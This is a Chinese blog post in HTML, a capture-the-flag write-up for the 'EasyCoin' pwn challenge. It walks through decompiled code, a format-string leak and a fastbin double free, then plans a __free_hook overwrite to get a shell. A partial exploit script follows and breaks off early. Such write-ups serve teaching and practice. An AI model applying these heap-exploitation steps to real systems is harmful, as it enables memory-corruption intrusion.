@@ -1,0 +1,862 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="google-site-verification" content="n74fzVGuzCcR7QhYWu-qaPH7lKOjZC3b3tDU0egKMNA" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="网鼎杯-EasyCoin这道题看了好久，结合大佬的博客以及自己动手调试，终于把它调出来了。 题目下载地址 链接：https://pan.baidu.com/s/19Imm-V-i71vpEN1mofwOhQ 密码：isek 程序分析程序的功能主要分为两部分：用户注册登录功能以及登陆后的功能。 用户管理功能该部分主要包括用户注册以及用户登录：  用户注册代码如下：123456789101112131">
+<meta property="og:type" content="article">
+<meta property="og:title" content="网鼎杯-EasyCoin">
+<meta property="og:url" content="https://e3pem.github.io/2018/11/20/wangdingbei/网鼎杯-EasyCoin/index.html">
+<meta property="og:site_name" content="e3pem&#39;s Blog">
+<meta property="og:description" content="网鼎杯-EasyCoin这道题看了好久，结合大佬的博客以及自己动手调试，终于把它调出来了。 题目下载地址 链接：https://pan.baidu.com/s/19Imm-V-i71vpEN1mofwOhQ 密码：isek 程序分析程序的功能主要分为两部分：用户注册登录功能以及登陆后的功能。 用户管理功能该部分主要包括用户注册以及用户登录：  用户注册代码如下：123456789101112131">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://espem.oss-cn-beijing.aliyuncs.com/18-11-14/93228414.jpg">
+<meta property="og:image" content="http://espem.oss-cn-beijing.aliyuncs.com/18-11-14/34318769.jpg">
+<meta property="og:updated_time" content="2019-08-07T08:43:43.013Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="网鼎杯-EasyCoin">
+<meta name="twitter:description" content="网鼎杯-EasyCoin这道题看了好久，结合大佬的博客以及自己动手调试，终于把它调出来了。 题目下载地址 链接：https://pan.baidu.com/s/19Imm-V-i71vpEN1mofwOhQ 密码：isek 程序分析程序的功能主要分为两部分：用户注册登录功能以及登陆后的功能。 用户管理功能该部分主要包括用户注册以及用户登录：  用户注册代码如下：123456789101112131">
+<meta name="twitter:image" content="http://espem.oss-cn-beijing.aliyuncs.com/18-11-14/93228414.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://e3pem.github.io/2018/11/20/wangdingbei/网鼎杯-EasyCoin/"/>
+
+
+
+
+
+  <title>网鼎杯-EasyCoin | e3pem's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">e3pem's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description"></h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://e3pem.github.io/2018/11/20/wangdingbei/网鼎杯-EasyCoin/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="e3pem">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="e3pem's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">网鼎杯-EasyCoin</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-20T12:20:00+08:00">
+                2018-11-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="网鼎杯-EasyCoin"><a href="#网鼎杯-EasyCoin" class="headerlink" title="网鼎杯-EasyCoin"></a>网鼎杯-EasyCoin</h1><p>这道题看了好久，结合大佬的博客以及自己动手调试，终于把它调出来了。</p>
+<p>题目下载地址</p>
+<p>链接：<a href="https://pan.baidu.com/s/19Imm-V-i71vpEN1mofwOhQ" target="_blank" rel="noopener">https://pan.baidu.com/s/19Imm-V-i71vpEN1mofwOhQ</a> 密码：isek</p>
+<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>程序的功能主要分为两部分：用户注册登录功能以及登陆后的功能。</p>
+<h3 id="用户管理功能"><a href="#用户管理功能" class="headerlink" title="用户管理功能"></a>用户管理功能</h3><p>该部分主要包括用户注册以及用户登录：</p>
+<ul>
+<li>用户注册代码如下：<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">*(&amp;ptr + v4) = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">v1 = (struct_user *)*(&amp;ptr + v4);</span><br><span class="line">v1-&gt;name = (__int64)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">v2 = (struct_user *)*(&amp;ptr + v4);</span><br><span class="line">v2-&gt;passwd = (__int64)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">*((_QWORD *)*(&amp;ptr + v4) + <span class="number">2</span>) = <span class="number">0x3B9ACA00</span>LL;</span><br><span class="line">*((_QWORD *)*(&amp;ptr + v4) + <span class="number">3</span>) = <span class="number">0L</span>L;</span><br><span class="line"><span class="built_in">strncpy</span>(*(<span class="keyword">char</span> **)*(&amp;ptr + v4), &amp;local_username, <span class="number">31u</span>LL);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Please input password\n&gt; "</span>, &amp;local_username);</span><br><span class="line">get_input(*((<span class="keyword">void</span> **)*(&amp;ptr + v4) + <span class="number">1</span>), <span class="number">31</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Verify input password\n&gt; "</span>, <span class="number">31L</span>L);</span><br><span class="line">get_input(&amp;local_username, <span class="number">31</span>);</span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(*((<span class="keyword">const</span> <span class="keyword">char</span> **)*(&amp;ptr + v4) + <span class="number">1</span>), &amp;local_username) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"[+] Registration success"</span>);</span><br><span class="line">  result = <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"[-] Password confirmation failed"</span>);</span><br><span class="line">  <span class="built_in">free</span>(*(<span class="keyword">void</span> **)*(&amp;ptr + v4));</span><br><span class="line">  <span class="built_in">free</span>(*((<span class="keyword">void</span> **)*(&amp;ptr + v4) + <span class="number">1</span>));</span><br><span class="line">  <span class="built_in">free</span>(*(&amp;ptr + v4));</span><br><span class="line">  *(&amp;ptr + v4) = <span class="number">0L</span>L;</span><br><span class="line">  result = <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>首先分配了一个0x20字节的空间来存储用户相关信息，结构体中各字段含义：用户名<code>name</code>、密码<code>passwd</code>、金币数<code>coin</code>、用户赠送或接受金币的记录链表<code>send_history_list</code>。具体如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//其中金币数量初始值为：0x3B9ACA00</span></span><br><span class="line"><span class="number">00000000</span> struct_user     struc ; (<span class="keyword">sizeof</span>=<span class="number">0x20</span>, mappedto_1)</span><br><span class="line"><span class="number">00000000</span> name            dq ?</span><br><span class="line"><span class="number">00000008</span> passwd          dq ?</span><br><span class="line"><span class="number">00000010</span> coin            dq ?</span><br><span class="line"><span class="number">00000018</span> send_history_list dq ?</span><br><span class="line"><span class="number">00000020</span> struct_user     ends</span><br></pre></td></tr></table></figure></p>
+<p>接着分别为用户名和密码分配0x20字节大小的空间，所以每新建一个用户会按照：<code>用户结构体--&gt;用户姓名--&gt;用户密码</code>的顺序分配三个大小为0x30自己的<code>chunk</code>。</p>
+<ul>
+<li>用户登录功能</li>
+</ul>
+<p>用户登录功能就是判断用户输入的用户名密码是否与注册的一致，并返回该用户结构体的指针。</p>
+<h3 id="用户登录后的功能"><a href="#用户登录后的功能" class="headerlink" title="用户登录后的功能"></a>用户登录后的功能</h3><p>用户登录后可以进行以下操作：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"------------------------------------------------"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">" 1: display user info"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">" 2: send coin"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">" 3: display transaction"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">" 4: change password"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">" 5: delete this user"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">" 6: logout"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"------------------------------------------------"</span>);</span><br></pre></td></tr></table></figure></p>
+<p>这里主要分析赠送金币功能、修改密码功能以及删除用户功能：</p>
+<ul>
+<li>赠送金币</li>
+</ul>
+<p>赠送金币函数在最开始先检查了赠送金币的总次数，总次数不能超过0x64,，这个次数<code>bss_send_serial</code>是存储在bss段上的。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)bss_send_serial &gt; <span class="number">0x64</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"[-] Transaction is over"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>接着连续分配两个0x28字节大小的内存（chunk大小也为0x30），分别作为接收者记录和发送者记录，并将其链入对应用户的赠送金币链表中（链入到链表的末尾）。该记录是一个结构体，包含的字段为：指向下一个记录的结构体指针<code>list_ptr</code>、赠送者或接受者结构体<code>usr</code>、赠送次数<code>id</code>（对应全局变量<code>bss_send_serial</code>）、赠送或接受标志<code>flag</code>、交易的金币数量<code>coin_num</code>。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> struct_send_history struc ; (<span class="keyword">sizeof</span>=<span class="number">0x28</span>, mappedto_2)</span><br><span class="line"><span class="number">00000000</span> list_ptr        dq ?</span><br><span class="line"><span class="number">00000008</span> user            dq ?</span><br><span class="line"><span class="number">00000010</span> id              dq ?</span><br><span class="line"><span class="number">00000018</span> flag            dq ?</span><br><span class="line"><span class="number">00000020</span> coin_num        dq ?</span><br><span class="line"><span class="number">00000028</span> struct_send_history ends</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>修改密码</li>
+</ul>
+<p>程序提供了修改密码的功能，往存放密码的chunk中读入最多31个字节数据，这些数据的内容使我们可以控制的，但是正常情况下只能往存放密码的chunk中读，且不存在溢出。</p>
+<ul>
+<li>删除用户</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>((<span class="keyword">void</span> *)a1-&gt;name);</span><br><span class="line"><span class="built_in">free</span>((<span class="keyword">void</span> *)a1-&gt;passwd);</span><br><span class="line"><span class="keyword">if</span> ( a1-&gt;send_history_list )</span><br><span class="line">&#123;</span><br><span class="line">  v5 = (struct_send_history *)a1-&gt;send_history_list;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    my_free((struct_user *)v5-&gt;user, v5-&gt;id);</span><br><span class="line">    <span class="keyword">if</span> ( !v5-&gt;list_ptr )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ptr = v5;</span><br><span class="line">    v5 = (struct_send_history *)v5-&gt;list_ptr;</span><br><span class="line">    ptr-&gt;user = <span class="number">0L</span>L;</span><br><span class="line">    ptr-&gt;list_ptr = <span class="number">0L</span>L;</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(v5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>删除用户的过程：<code>free</code>掉用户名–&gt;<code>free</code>掉密码–&gt;遍历金币交易链表释放相关的金币交易记录–&gt;<code>free</code>用户结构体。其中释放金币交易链表时逐个的从取被删除用户的交易链表取交易记录，对于每一个交易记录，根据其中的用户字段来从对应的用户的链表中找到与该交易记录配对的块，将其释放后在释放当前交易记录。（即在释放当前记录之前，先调用了<code>my_free</code>函数来释放当前记录配对的另一个交易记录——赠送记录与接收记录）</p>
+<h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><p>看了好久都不知道这个程序的问题在哪里，看了大佬们的分析（<a href="http://p4nda.top/2018/08/27/WDBCTF-2018/#EasyCoin" target="_blank" rel="noopener">这里是链接</a>），其实主要的问题有两个：</p>
+<ol>
+<li><code>可以自己给自己赠送金币</code>，再结合是先释放完了交易链表之后再释放用户结构体（用户的<code>send_history_list</code>字段没有清零），导致用户可以干预程序的执行。</li>
+<li>在输入命令时存在格式化字符串漏洞，用户可以输入四个字节长的数据来进行利用，泄露部分寄存器以及栈中的数据。</li>
+</ol>
+<p>这样说肯定有很多人不会理解，对的，因为我想了好久也都没有理解到底是怎么回事。按照赠送金币时的流程，如果是自己给自己赠送金币的话，那么必然是两个交易记录(…-&gt;A-&gt;B-&gt;NULL)被链入同一个链表，这样不管怎样在删除用户时，首先在<code>my_free</code>函数中会将A释放一次，函数返回后A又会被释放一次，同一个块被连续释放两次，不管怎么样都会产生<code>double_free</code>的崩溃，那这样我们还怎么进行漏洞利用呢？（就是被这个问题困扰了很久）</p>
+<p>这里忽略了一个细节，那就是如果用户首先给另一个用户赠送了金币（即先进行正常的金币交易），然后在给自己赠送一次金币，此时链表的信息如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">两个用户：A和B</span><br><span class="line"><span class="number">1.</span> A-&gt;B，A用户首先给B赠送</span><br><span class="line"><span class="number">2.</span> A-&gt;A，接着A用户给自己赠送</span><br><span class="line"><span class="comment">//赠送完毕后A和B的交易记录链表如下：</span></span><br><span class="line">A-&gt;send_history_list=chunk2-&gt;chunk3-&gt;chunk4</span><br><span class="line"><span class="comment">//由于A给B赠送时，先分配的是接受者的交易记录，所以B这里的是chunk1</span></span><br><span class="line">B-&gt;send_history_list=chunk1</span><br></pre></td></tr></table></figure></p>
+<p>然后在这个时候删除用户A，会出现什么情况呢？<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//删除部分的代码在贴一遍</span></span><br><span class="line">  <span class="keyword">if</span> ( a1-&gt;send_history_list )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = (struct_send_history *)a1-&gt;send_history_list;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      my_free((struct_user *)v5-&gt;user, v5-&gt;id);</span><br><span class="line">      <span class="keyword">if</span> ( !v5-&gt;list_ptr )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      ptr = v5;</span><br><span class="line">      v5 = (struct_send_history *)v5-&gt;list_ptr;</span><br><span class="line">      ptr-&gt;user = <span class="number">0L</span>L;</span><br><span class="line">      ptr-&gt;list_ptr = <span class="number">0L</span>L;</span><br><span class="line">      <span class="built_in">free</span>(ptr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(v5);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p>
+<ol>
+<li>首先根据chunk2中的用户信息，找到用户B的链表，并删除chunk1（注意此时A的<code>send_history_list</code>指向的是chunk2）</li>
+<li>删除chunk1之后，会删除A用户的chunk2（注意此时A的<code>send_history_list</code>还是指向的是chunk2）</li>
+<li>根据chunk3的用户信息，找到另一个用户（这里还是A，注意这里A的<code>send_history_list</code>指向的还是chunk2，但是chunk2现在已经被放在<code>fastbin</code>中了），所以在函数myfree中，会将fastbin中chunk大小为0x30的链表当成是A用户的交易记录链表并进行遍历，删除其中<code>id</code>字段与chunk3中的<code>id</code>字段相同chunk。</li>
+<li>接着会释放chunk3</li>
+<li>同样根据chunk4中的用户字段（这里还是A自己）来在<code>fastbin</code>中释放虚假的交易记录</li>
+<li>释放chunk4</li>
+</ol>
+<p>所以实际上并不是所有自己给自己赠送金币都会造成<code>double free</code>的崩溃，之前的问题也就解决了。按照上面分析的结果，就可以利用<code>fastbin attack</code>中的<code>double free</code>来进行漏洞利用了。</p>
+<p>同时还有一点，在删除了一对正常交易块之后再删除自己给自己赠送金币的交易块时，在<code>myfree</code>函数中，把fastbin链表当成用户的交易记录链表。<code>fastbin</code>中的<code>prev_size</code>字段对应的才是<code>struct_send_history</code>结构体的<code>list_ptr</code>字段。<strong>就拿上面的分析例子来说，首先会根据A用户的<code>send_history_list</code>找到chunk1的fd字段，chunk1将指向下一个chunk的首地址，也就是<code>prev_size</code>，接着就会以该chunk的<code>prev_size</code>字段作为<code>list_ptr</code>去寻找下一个交易块。</strong> 所以我们只需要能够控制这个<code>prev_size</code>字段就可以让<code>myfree</code>函数释放我们指定的chunk。</p>
+<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><h3 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h3><p>格式化字符串限制了输入内容的长度不超过四字节，但是这里仍然能利用，例如<code>%3$p</code>，将输出寄存器rcx中的值(参数传递依次为：rdi,rsi,rdx,rcx,r8,r9，这里偏移为3且第一个参数为格式化字符串本身rdi，故输出rcx的值)<br><img src="http://espem.oss-cn-beijing.aliyuncs.com/18-11-14/93228414.jpg" alt=""></p>
+<p>从图中可以看到通过rcx我们可以泄露libc的基址，从栈上的数据，我们可以泄露堆的基址。有了这两个基址后就可以为后面的利用做准备了。</p>
+<h3 id="double-free"><a href="#double-free" class="headerlink" title="double free"></a>double free</h3><p><code>double free</code>可以将fastbin劫持到我们指定的地方，这里我们需要能够使的chunk的size字段满足fastbin的要求，发现bss段上的<code>bss_serial_num</code>刚好是我们可以通过赠送金币的次数来控制的，因此通过赠送金币可以让他的值刚好为0x21，来满足<code>double free</code>的条件。</p>
+<p>在成功<code>double free</code>之后，我们可以将0x6030e0处的chunk作为用户的password字段，这样通过修改密码的功能就可以修改存储用户结构体指针的数组0x603100(ptr)中的内容了。每个用户的password字段都是我们可以控制的，我们可以伪造password字段的chunk为一个虚假的用户结构体（虚假用户结构体中的password字段指向的值<code>__free_hook</code>），并修改ptr中的内容，让其指向这个虚假的用户结构体。通过空密码（因为<code>__free_hook</code>默认的值为0x0）来登录该用户，并修改密码来将<code>__free_hook</code>的值为system函数的地址。通过free一个用户名为 <em>/bin/sh</em> 的用户拿到shell。</p>
+<p>前面提到过，在myfree函数中我们需要控制<code>prev_size</code>字段，让其指向我们提前构造好的chunk，这里有一个小细节：正常情况下分配内存是由低地址往高地址分配的，所以我们登录用户(用户A)之后向其他用户（用户B）正常赠送金币，会得到两个chunk(chunk1低地址，chunk2高地址)，而在删除用户的时候，通过A的<code>send_history_list</code>找到的是chunk2，然后根据其<code>fd</code>来找到chunk1，我们不能通过chunk2的<code>coin_num</code>字段来控制chunk1的<code>prev_size</code>内容，因为chunk1在低地址。</p>
+<p><img src="http://espem.oss-cn-beijing.aliyuncs.com/18-11-14/34318769.jpg" alt=""></p>
+<p>所以在exp中会有这样的代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">login(<span class="string">'bbbb'</span>,<span class="string">'bbbb'</span>)</span><br><span class="line">sendCoin(<span class="string">'e3pem'</span>,<span class="number">0x3</span>)</span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 经过上面的赠送在删除之后，这里用户bbbb赠送给e3pem时得到的chunk1了</span></span><br><span class="line"><span class="comment"># 通过chunk1的send_history_list就能控制chunk2的prev_size字段了</span></span><br><span class="line"><span class="comment"># double free</span></span><br><span class="line">register(<span class="string">'bbbb'</span>,<span class="string">'bbbb'</span>)</span><br><span class="line">login(<span class="string">'bbbb'</span>,<span class="string">'bbbb'</span>)</span><br><span class="line">sendCoin(<span class="string">'e3pem'</span>,heap_base+e3pem_pass_off)</span><br><span class="line">sendCoin(<span class="string">'bbbb'</span>,<span class="number">0x4</span>)</span><br><span class="line">delete()</span><br></pre></td></tr></table></figure></p>
+<h2 id="利用代码"><a href="#利用代码" class="headerlink" title="利用代码"></a>利用代码</h2><p>exp如下所示：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span 